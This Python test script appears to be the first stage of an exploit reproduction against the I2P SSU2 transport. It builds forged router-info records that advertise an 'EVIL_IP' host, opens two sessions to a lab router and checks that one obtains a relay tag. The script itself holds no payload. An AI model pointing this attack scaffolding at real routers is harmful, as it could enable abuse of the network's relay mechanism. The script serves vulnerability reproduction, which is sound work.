#!/usr/bin/env python3
"""smoke1.py — stage-1 sanity: RI build/parse roundtrip, dual-session handshake
against lab Bob, Charlie gets a relay tag. LOCAL LAB ONLY (maintainer reproduction)."""
import sys, time, base64, struct
sys.path.insert(0, "/home/z/my-project/scripts")
from ssu2lib import *

def main():
    t0 = time.time()
    bob = bob_keys("/home/z/my-project/lab/bob-data/router.info")
    log("bob", "ident=%s.. i=%s.. s=%s.. host=%s port=%d" %
        (bob["ident_hash"][:8].hex(), bob["i"][:6].hex(), bob["s"][:6].hex(),
         bob["host"], bob["port"]))

    # --- identities ---
    alice = NodeIdentity()
    charlie = NodeIdentity()

    def mk_ri(ident, ts):
        return build_ri(ident, ts,
                        [("netId", "2"), ("caps", "R"), ("router.version", "2.61.0")],
                        [("host", EVIL_IP), ("port", str(ALICE_PORT)),
                         ("s", i2p_b64(ident.st_pub)),
                         ("i", i2p_b64(ident.ikey)),
                         ("v", "2")])

    ri_a = mk_ri(alice, int(time.time() * 1000))
    ri_c = mk_ri(charlie, int(time.time() * 1000) + 10)
    # RI self-parse check
    pa, pc = parse_ri(ri_a), parse_ri(ri_c)
    assert pa["ssu2"]["host"] == EVIL_IP and pa["ssu2"]["v"] == "2"
    assert sha256(ri_a[:-64]) and len(ri_a) == len(ri_c)
    log("ri", "alice ri %d B, charlie ri %d B, identity %d B" %
        (len(ri_a), len(ri_c), len(alice.identity_buf())))

    # --- sessions ---
    sa = Peer("alice", alice, ALICE_PORT, bob)
    sc = Peer("charlie", charlie, CHARLIE_PORT, bob)

    # Charlie first: wants relay tag (RelayTagRequest in SessionRequest)
    sc.handshake(ri_c, relay_tag_req=True)
    # wait for Bob's post-establishment traffic, look for the tag if not seen yet
    # (tag comes inside SessionCreated — captured in _process_session_created)
    log("charlie", "established, relay_tag=%s" % sc.relay_tag)

    sa.handshake(ri_a)
    log("alice", "established")

    # small keepalive exchange: ack whatever bob sent
    for p, nm in ((sa, "alice"), (sc, "charlie")):
        r = p.recv_data(timeout=2.0)
        log(nm, "post-establish recv: %s" % (str(r)[:120],))

    ok = sc.relay_tag is not None
    log("RESULT", "relay tag acquired: %s  (%.1fs)" % (ok, time.time() - t0))
    return 0 if ok else 1

if __name__ == "__main__":
    sys.exit(main())
